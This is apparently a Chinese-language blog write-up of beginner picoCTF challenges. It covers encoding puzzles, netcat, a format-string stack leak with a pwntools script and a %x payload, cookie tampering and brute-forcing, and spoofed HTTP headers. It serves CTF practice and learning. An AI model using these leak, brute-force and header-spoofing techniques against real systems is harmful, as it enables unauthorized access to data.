---
title: "\U0001F916picoCTF Write\U0001F199"
date: 2021-06-18 18:34:35
description: 一些入門 CTF 題目的 Write🆙🥺
slug: picoCTF-Writeup
tags: 
    - CTF
categories: 
    - Writeup
image: https://cdn.jsdelivr.net/gh/ncchen99/web-app-assets@2.3/blog/wallpaper/img8.jpg

---

最近想說來練習CTF的東西🥺 偶隔膜覺得CTF好難哇😰 只能先從pico的簡單題目開始惹💩 有大佬說寫writeup會很有幫助😈 先來試試看窩🥶 

---

## 😺Obedient Cat
- Category: General Skills
- Score: 5

### 💁Description

This file has a flag in plain sight (aka "in-the-clear"). [Download flag](https://mercury.picoctf.net/static/2d24d50b4ebed90c704575627f1f57b2/flag)

### 🙆Solution
下載下來然後打開🥺

---

## 🙊Mod 26
- Category: Cryptography
- Score: 10

### 💁Description

Cryptography can be easy, do you know what **ROT13** is? cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_nSkgmDJE}

### 🙆Solution
去Google一下原來 ROT13 是 rotate by 13 places 的意思，是相差十三個字母的凱撒加密，拿去線上CTF小工具解一下，結果全部變小寫🤢，眼睛不好看不出來，只好查解答🙊，原來 ROT13 可以用一個叫做`nkf`的軟件變回來，用法：

```
echo "cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_nSkgmDJE}" | nkf -r
```

`nkf` 是一個漢字的轉換器的樣子😮　不過它還可以用[參數](https://linux.die.net/man/1/nkf)`-r` 轉換 `ROT13` 。

---

## 🐍Python Wrangling
- Category: General Skills
- Score: 10

### 💁Description

Python scripts are invoked kind of like programs in the Terminal... Can you run [this Python](https://) script using [this password](https://) to get [the flag](https://)?

### 🙆Solution
好像要執行臘個Python檔案的樣子🐌　偶把他們（三個檔案）全部載下來，生氣氣載是ㄗㄞˋ不是ㄗㄞˇ，打字都打不出來🤧，它的意思是要用這個小程式解密`flag.txt.en`的樣子，用一下
```bash
python3 ende.py
```
它寫說：
```
Usage: ende.py (-e/-d) [file]
```
所以就用醬子：
```
python3 ende.py -d flag.txt.en
```
應該會有答案跑出來😲😲　它希望偶用pico的小黑黑terminal的樣子，不過偶都本末倒置🤕🤕


---


## 🏁Wave a flag

- Category: General Skills
- Score: 10

### 💁Description

Can you invoke help flags for a tool or binary? [This program]([https://](https://mercury.picoctf.net/static/b28b6021d6040b086c2226ebeb913bc2/warm)) has extraordinarily helpful information...

### 🙆Solution

好像要執行臘個程式的樣子🐌　先把它載下來，可以練習用 `wget` ：

```bash
wget https://mercury.picoctf.net/static/b28b6021d6040b086c2226ebeb913bc2/warm
```

如果直接執行的的話📫　它會說不行🥺　所以幫它加一個執行的權限😈

```bash 
chmod +x warm
```

再來執行🥺

```bash
./warm
```

它寫說：
```
Hello user! Pass me a -h to learn what I can do!
```
所以就用醬子：
```
./warm -h
```
應該會有答案跑出來😲😲

---


## 👁‍information


- Category: Forensics
- Score: 10

### 💁Description

Files can always be changed in a secret way. Can you find the flag? [cat.jpg](https://mercury.picoctf.net/static/c28a959c5605d5f67480d5dd3a77f302/cat.jpg)

### 🙆Solution

先把😺圖片載下來，結果看不出神模東西🐌　開始查別人的writeup😕 原來可以用[這個網頁](https://29a.ch/photo-forensics/#strings)看檔案裡面可以顯示的字，也可以用 `strings` 的指令na，只是因為太大惹🥺，所以偶的`terminal`會看不到上面的字，所以可以加一個`-10`只顯示那些一行大於 **10** 個字的：

```bash
strings -10 cat.jpg
```

發現裡面有這個東西

:::spoiler 很像xml的東C
```xml=
<x:xmpmeta xmlns:x='adobe:ns:meta/' x:xmptk='Image::ExifTool 10.80'>
<rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'>
 <rdf:Description rdf:about=''
  xmlns:cc='http://creativecommons.org/ns#'>
  <cc:license rdf:resource='cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9'/>
 </rdf:Description>
 <rdf:Description rdf:about=''
  xmlns:dc='http://purl.org/dc/elements/1.1/'>
  <dc:rights>
   <rdf:Alt>
    <rdf:li xml:lang='x-default'>PicoCTF</rdf:li>
   </rdf:Alt>
  </dc:rights>
 </rdf:Description>
</rdf:RDF>
</x:xmpmeta>
```
:::
<br>

然後裡面的這個是一個base64編碼的文字👿
```xml
<cc:license rdf:resource='cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9'/>
```
可以到[線上](https://www.base64decode.org/)轉一下或是練習指令：

```bash
echo "cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9" | base64 -d
```
應該會有答案跑出來😲😲 葛是醬擠偶真的想不到耶🥺🥺

---

## 😻Nice netcat...

- Category: General Skills
- Score: 15

### 💁Description

There is a nice program that you can talk to by using this command in a shell: 
`$ nc mercury.picoctf.net 22342`, but it doesn't speak English...

### 🙆Solution

這個題目要偶們用`nc`這個小工具連到 `mercury.picoctf.net 22342`的樣子，去查惹一下，`nc`是用`TCP`或`UDP`協定對端點進行讀寫的小工具，用法就像題目寫的那樣子。

連上去之後它吐惹很多數字出來，猜不出來是葛摩🙄 只好看一下提示，原來是`ASCII`的十進位數字🙂 寫一個小Python來轉換😎

```python=
from __future__ import print_function
import socket

HOST = "mercury.picoctf.net"
PORT = 22342
BUFFER = 4096

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

while 1:
    recv = sock.recv(BUFFER).split()
    if recv:
        for num in recv:
            num.strip()
            print(chr(int(num)),end="")
    else:
        continue

sock.close()
```
應該會有答案跑出來😲😲

---

## 👩‍🏭Transformation

- Category: Reverse Engineering
- Score: 20

### 💁Description

I wonder what this really is... [enc ](https://mercury.picoctf.net/static/e47483f88b12f2ab0c46315afc12f64d/enc)
```python
''.join([chr((ord(flag[i]) << 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)])
```

### 🙆Solution

本來以為 `enc` 的檔案是要拿來執行的🥵　結果只是一個文字檔，看惹提示還是不懂🔧，只好去查別人的write🆙，原來題目的意思是檔案裡的字串是`flag` 經由下面ㄉPython程式轉換出來的，所以偶們要按照程式的規則推回去😰　

結果偶發現別人解答的程式跑惹會報錯，題目的轉換程式也是🥺，看起來問題是這些`unicode` 編碼的東西用 `Python` 的 `ord()` 轉出來剩下8bit但是實際上應該是16bit才對，提示又說需要找一些線上編碼的工具，所以偶先拿去[這個網頁](https://www.online-toolz.com/tools/text-unicode-entities-convertor.php)轉成樣子怪怪的十六進位數字編號，然後寫一個步驟相反的小Python🐍 

題目的Python會把 `flag` 兩個兩個字一組，第一個字左移8位（位元運算）然後轉成ASCII的數字編號　加上　轉成ASCII數字編號的第二個字，再把這個東西由數字編號轉成一個字元（不過偶的`chr()`是不能接收大於`256[8bit]`的參數na🥺🥺）。

> 以　flag　的前兩個字舉例🤬

| 原本的字 | ASCII的編號 | 第一個字左移8bit |  二進位 |
| -------- | ----------- | ---------------- | --- |
| p        | 112         | 28672            |   111000000000000  |
| i        | 105         | 105              |   000000001101001  |
編號(28672 + 105)的 Unicode 應該會是**灩**


所以逆著做就需要先把一個字變成兩個，用右移推出第一個字，第二個字偶是用取模把後8個bit用粗乃na，可能不是很好🤒🤒　然後再把它們各自轉回字元🙊　醬子應該就有答案惹💋

```python=
enc = "%u7069%u636F%u4354%u467B%u3136%u5F62%u6974%u735F%u696E%u7374%u3334%u645F%u6F66%u5F38%u5F65%u3134%u3161%u3066%u377D"
enc = enc.split("%u")
for i in range(1, len(enc)):
    num = int(enc[i].lower(), 16)
    print(chr(num >> 8)+chr(num % (1 << 8)), end="")

```

---

## 📺Stonks

- Category: Binary Exploitation
- Score: 20

### 💁Description

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c) `nc mercury.picoctf.net 33411`



### 🙆Solution

唉這個好難哇🥺🥺　這個題目叫偶們連到 `mercury.picoctf.net 33411` 它還有附這個程式　`vuln.c` ，要從裡面找到有問題的地方🤕　偶太呆只好去找別人的Write🆙，偶有看惹 [Kasimir123](https://github.com/Kasimir123/CTFWriteUps/tree/main/2021-03-picoCTF/stonks)　大大和 [Dvd848](https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Stonks.md) 大佬的，偶的程式是用他們的改的🤢　

`vuln.c` 的問題在這裡：
```c=
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```

在 `buy_stonks` 函式裡的 `printf` 少惹格式化字符串的參數，這個叫做 `Uncontrolled format string` 格式化字串漏洞的樣子，如果偶們使用 `%x` 或 `%X$p` (`X` 為任意正整數)，可以把堆疊上的資料打印出來。

```c=
char api_buf[FLAG_BUFFER];
FILE *f = fopen("api","r");
// ... 中間省略 ...
fgets(api_buf, FLAG_BUFFER, f);
```

程式前面有把🏁 [api檔案] 讀到 `api_buf` 這個字串裡面，所以可以打出來😻 偶們先在 `terminal` 試試看🧑‍💻

```
> nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x 
Buying stonks with token:
919a3d0-804b000-80489c3-f7f02d80-ffffffff-1-9198160-f7f10110-f7f02dc7-0-9199180-1-919a3b0-919a3d0-6f636970-7b465443-306c5f49-345f7435
Portfolio as of Sun Jun 20 10:23:09 UTC 2021


1 shares of FZH
2 shares of P
2 shares of E
73 shares of ZX
41 shares of PNBU
1707 shares of TXUL
77 shares of YMA
Goodbye!
```

不過 **%** 出來的東西是16進位的資料然後有八位，不過偶不知到為隔膜是八位，因為書裡面的有十六位，不過如果要把這些數字轉成字串的話可以用 `pwntool` 裡面的 `p32()`，如果有十六位就用 `p64()` ，它還會幫忙把字串倒過來，好像是因為Linux是小頭端的關西，這裡有危機百科的[大頭端和小頭端](https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82%E5%BA%8F)。　

還有要注意的地方就是`pwntool` 的 `recvline` 回傳的資料是byte的型態所以要用`.decode()`才會變成字串ㄛ📫 `p32()`也是ㄛ🤭
```python=
from pwn import *

flag = b''
r = remote("mercury.picoctf.net", 33411)
r.sendlineafter("What would you like to do?\n", "1")
payload = "%x-" * 30
r.sendlineafter("What is your API token?\n", payload)
r.recvuntilS("Buying stonks with token:\n")
out = r.recvline().decode()
for d in out.split("-"):
    try:
        res = p32(int(d, 16))
        flag += res
    except Exception:
        pass
r.recvall()

print(flag)
```
應該會有答案跑出來😲😲

---


## 🌺GET aHEAD


- Category: Web Exploitation
- Score: 20

### 💁Description

Find the flag being held on this server to get ahead of the competition http://mercury.picoctf.net:15931/



### 🙆Solution
先把網頁打開，然後它會長醬子🥺


| 兩個按鈕 |HTML |
| -------- | -------- |
| ![](https://i.imgur.com/qqo9NB7.png)     |![](https://i.imgur.com/40ZfnfP.png)|

可以看出來紅色的按紐是用 GET 方法，藍色的是用 POST ，然後偶就不會惹🤧　偶看惹 [rschauhan2199](https://ctftime.org/user/95909) 和 [abbas](https://ctftime.org/user/106830) 的Write🆙 原來題目 get aHEAD 的意思是**用HEAD方法請求**，可以用這些方法：
#### cURL

```bash 
curl -I  http://mercury.picoctf.net:53554/index.php
```

用 `curl` 這個工具加上 `-I` 的參數發一個 `HEAD` 請求。

#### Burpsuite

這個要先安裝，偶孤陋寡聞沒用過🤕 先去[官網](https://portswigger.net/burp/communitydownload)下載來安裝。其實偶搞不清楚這個軟件要怎摸用na😭😭

還好有 **rschauhan2199** 大大做的[教學影片](https://ctftime.org/writeup/26931)🥰🥰可能第一次使用需要設定一些東C，接下來的步驟大guy是醬子：


![](https://i.imgur.com/6LWvIlM.png)

開一個 `Project` ，然後選 `Proxy` ⏭️ `Intercept` ， 確定第三個按鈕 `Intercept in on` 是藍藍的，然後按 `Open Browser` ，接下來會打開 Brupsuite 的神奇 Chromium😈

![](https://i.imgur.com/0kdl7pT.png) 

然後就把網址貼過來↩ 接下來它應該會一直轉轉轉，偶們在回到 `Brupsuite` 🔙 

![](https://i.imgur.com/33XgyiC.png)

可以看到請求ㄉ資訊，不過這個是可以修改的窩，修改完按 `Forward` 就會送粗惹喔～嘗試過藍色和紅色的按鈕之後可以發現它們的差別只有一個是 `GET` ♂️ 一個是 `POST` ♀️ 所以偶們在按一次按鈕，然後把文字匡裡的 `GET` 改成 `HEAD` ㄛ⛎ 

![](https://i.imgur.com/4z94Svk.png)

按下 `forward` 之後，可以到 `HTTP history` 的分頁看結果，應該是最後一個請求，在 `Response` 那裡應該會有答案ㄛ☯

![](https://i.imgur.com/qch5cFw.png)

也可以右鍵 `Send to Repeater` 然後在上面的 `Repeater` 分頁再做一次窩🔱

![](https://i.imgur.com/m9hTH5X.png)

![](https://i.imgur.com/F5KTEWm.png)

#### Python requests

```python=
import requests
r = requests.head('http://mercury.picoctf.net:15931/index.php')
print(r.headers)

```
醬子也可以ㄛ😲😲


---


## 🍻Cookies


- Category: Web Exploitation
- Score: 40

### 💁Description

Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:21485/



### 🙆Solution

先把網頁打開，然後它會長醬子🥺

![](https://i.imgur.com/CdZHqry.png)

挖結果偶又不會惹🥺　偶去看惹 [vivian-dai](https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Web%20Exploitation/Cookies/Cookies.md) 大大的Write🆙 還有 [chrissypoo](https://www.youtube.com/watch?v=dY1pGjacF8w) 的影片。

這題如果偶們在輸入匡裡面輸入 `snickerdoodle` 會發現跑到這裡 :mage: 

![](https://i.imgur.com/EuNrKBF.png)

偶們可以按 `f12` 之後在上面的分頁選 `Application` 再左邊的地方選 `Cookies`

![](https://i.imgur.com/2l3VfBq.png)

可以看到它有使用一個叫做 `name` 的 `cookie` ，偶們如果把 `name` 的值從 $0$ 改成 $1$ ，再從新整理網頁，會發現跑到新的一頁惹🤭　所以偶寫一個小 `Python` 去讓它試🐍 

```python=
import requests
import re

for i in range(1, 10000):
    r = requests.get("http://mercury.picoctf.net:21485/check",
                     cookies={"name": str(i)})
    # Requests 請求可以帶 Cookies
    if "picoCTF" in r.text:
        print("Cookies: {name:", i, "}\n")
        for line in r.text.split():
            if "picoCTF" in line:
                print(line)
        break

```

醬子應該就會有答案惹💩

---

## 👹Insp3ct0r


- Category: Web Exploitation
- Score: 50

### 💁Description

Kishor Balan tipped us off that the following code may need inspection: https://jupiter.challenges.picoctf.org/problem/44924/ (link) or http://jupiter.challenges.picoctf.org:44924


### 🙆Solution

那個因為偶覺得Web比較好玩💋 所以都先做魏ㄅ的題目🥂
題目要偶們按右鍵檢查這個網頁的樣子🥶

![](https://i.imgur.com/jGKdwNv.png)

在 `HTML` 的部份我們可以看到 `flag` 的第一個部份，然後點上面 `Sources` 的分頁，可以看到 `Javascript` 和 `CSS` 的檔案，裡面有剩下的 `Flag` 。


![](https://i.imgur.com/IE8kcCe.png)


醬子應該就會有答案惹💩

---



## 😼Scavenger Hunt

- Category: Web Exploitation
- Score: 50

### 💁Description

There is some interesting information hidden around this site http://mercury.picoctf.net:27393/. Can you find it?

### 🙆Solution

題目要偶們按右鍵檢查這個網頁的樣子🥶

![](https://i.imgur.com/JuwQhpF.png)

在 `HTML` 的部份我們可以看到 `flag` 的第一個部份，然後點上面 `Sources` 的分頁，可以看到 `CSS` 的檔案，裡面有第二個部份的 `Flag` ，在 `JavaScript` 的檔案裡面它寫說 `/* How can I keep Google from indexing my website? */` 

偶有看[這個網頁](https://developers.google.com/search/docs/advanced/crawling/block-indexing)，葛4它沒有用 `meta` 標籤，回應的 `http header` 偶也沒有看到 `X-Robots-Tag` 的東C，原來用 `robots.txt` 也可以，所以偶們試試看前往 http://mercury.picoctf.net:27393/robots.txt 可以看到第三部份的 `flag` 。

接著它說 `# I think this is an apache server... can you Access the next flag?` ，這個偶就想不粗來惹所以還是去看惹別人的 [`Write🆙`](https://github.com/xnomas/PicoCTF-2021-Writeups/blob/main/Scavenger_Hunt/README.md)，這個倫寫的好仔細哈哈😙😙 ，`.htaccess` 是 `Apache` 用來設置權限規則的檔案，所以偶們訪問 http://mercury.picoctf.net:27393/.htaccess

接著它說 `I love making websites on my Mac, I can Store a lot of information there.` 偶就想到 `.DS_Store` ，偶只知道用 Mac 的倫都會有這個東C，它是做神摸的偶不珠到😂。

醬子應該就會有答案惹💩

看惹 `Dvd848` 的 `Write🆙` 才知道可以直接用 `dirsearch` 這個工具暴力去搜有神摸檔案😇 不過會花一些時間😈

![](https://i.imgur.com/aBfrJKG.jpg)

---

## 🐾where are the robots

- Category: Web Exploitation
- Score: 100

### 💁Description

Can you find the robots? https://jupiter.challenges.picoctf.org/problem/60915/ or http://jupiter.challenges.picoctf.org:60915

### 🙆Solution

這個題目一樣是跟 `robots.txt` 有關西的東C，偶們試試看 https://jupiter.challenges.picoctf.org/problem/60915/robots.txt

結果發現它醬子寫：
```yaml
User-agent: *
Disallow: /8028f.html
```

偶們再試試看 https://jupiter.challenges.picoctf.org/problem/60915/8028f.html
醬子就有答案惹😇

---



## 🦄logon


- Category: Web Exploitation
- Score: 100

### 💁Description

The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? https://jupiter.challenges.picoctf.org/problem/15796/ or http://jupiter.challenges.picoctf.org:15796

### 🙆Solution

偶先試試看隨便打一個帳號密碼是試試看，結果可以登入，不過神
模都沒有，看它的 `HTML` 登入的地方長這樣🐻 

```html=
<div class="jumbotron">
    <p class="lead"></p>
    <div class="login-form">
        <form role="form" action="/login" method="post">
            <div class="form-group">
                <input type="text" name="user" id="email" class="form-control input-lg" placeholder="Username">
            </div>
            <div class="form-group">
                <input type="password" name="password" id="password" class="form-control input-lg" placeholder="Password">
            </div>
        </form>
    </div>
    <div class="row">
        <div class="col-xs-12 col-sm-12 col-md-12">
            <input type="submit" class="btn btn-lg btn-success btn-block" value="Sign In">
        </div>
    </div>
</div>
```

偶看不懂🐴🐴，臘個 `form` 也沒把 `submit` 包起來🐣 所以偶用 `wappalyzer` 看一下，感覺是 `Cookie` 在搞。

![](https://i.imgur.com/mivrvsl.png)

果然是它在搞事，可以按 `f12` 看一下 `Cookies` ，有一個叫做 `admin` 的，把它改成 `True` 之後重新整理就有惹🐻

![](https://i.imgur.com/VD6GrE5.png)


---



## 🐻dont-use-client-side

- Category: Web Exploitation
- Score: 100

### 💁Description

Can you break into this super secure portal? https://jupiter.challenges.picoctf.org/problem/29835/ or http://jupiter.challenges.picoctf.org:29835

### 🙆Solution

偶先試試看隨便打一個密碼是試試看，它會縮不對，題目叫做不要相信客戶端，所以偶按右鍵檢查 `Verify` 的按鈕，發現它的 `onclick` 會觸發 `verify();` 函式，偶們到找到 `verify` 就可以看到答案惹🍑

```javascript=
function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(0, split) == 'pico') {
      if (checkpass.substring(split*6, split*7) == '723c') {
        if (checkpass.substring(split, split*2) == 'CTF{') {
         if (checkpass.substring(split*4, split*5) == 'ts_p') {
          if (checkpass.substring(split*3, split*4) == 'lien') {
            if (checkpass.substring(split*5, split*6) == 'lz_7') {
              if (checkpass.substring(split*2, split*3) == 'no_c') {
                if (checkpass.substring(split*7, split*8) == 'e}') {
                  alert("Password Verified")
                  }
                }
              }

            }
          }
        }
      }
    }
    else {
      alert("Incorrect password");
    }
}
```


---


## 🥝It is my Birthday

- Category: Web Exploitation
- Score: 100

### 💁Description

I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website. http://mercury.picoctf.net:20277/

### 🙆Solution

題目落落長，英文不好看有夠久🍐，結果還是不會所以偶看惹 [Rahul Singh](https://www.youtube.com/watch?v=yn2MajG2dMg) 的影片，原來題目要偶們上傳兩個內容不同 `PDF` 的檔案，不過要有相同的 `md5` 哈西，偶們可以去 Google ：`md5 collision` ，不過偶不知道為隔膜自己把查到的字串加到檔案裡 `md5` 會不一樣，所以偶是完全依照 Rahul Singh 的方法na🍕，去 [stackexchange.com](https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value) 下載下面圖片的那兩個檔案🦄

![](https://i.imgur.com/iO9o1dI.png)

然後在把副檔名改成 `.pdf` 上傳到題目那裡🆙，就會有答案惹🚀

---

## 🐣Who are you?

- Category: Web Exploitation
- Score: 100

### 💁Description

Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:52362/

### 🙆Solution

這個題目有點壞👺，它的 `hint` 給惹 `http` 的文件，網頁寫說
> Only people who use the official PicoBrowser are allowed on this site!

感覺又是需要改 `http headers` 的題目，偶是用 `Python` na，用 `BrupSuite` 也可以，先加一個 `User-Agent`:

```python=
import requests
headers = {"User-Agent": "PicoBrowser"}
r = requests.get("http://mercury.picoctf.net:52362/", headers=headers)
print(r.text)
```

結果它又說它不相信其他地方來的人，之後還有很多要求😢 偶查惹很久 Google 特別是瑞典話的那個，感覺有兩種都符合他的說法🔕 最後的 `headers` 長這樣：

```python=
import requests

headers = {"User-Agent": "PicoBrowser",
           "Referer": "http://mercury.picoctf.net:52362/",
           "Origin": "http://mercury.picoctf.net:52362/",
           "Date": "Tue, 15 2018 08:12:55 GMT",
           "DNT": "1",
           "X-Forwarded-For": "31.15.32.45",
           "Accept-Language": "sv-SE",
           "Content-Language": "sv-SE"}
r = requests.get("http://mercury.picoctf.net:52362/", headers=headers)
print(r.text)
```

---

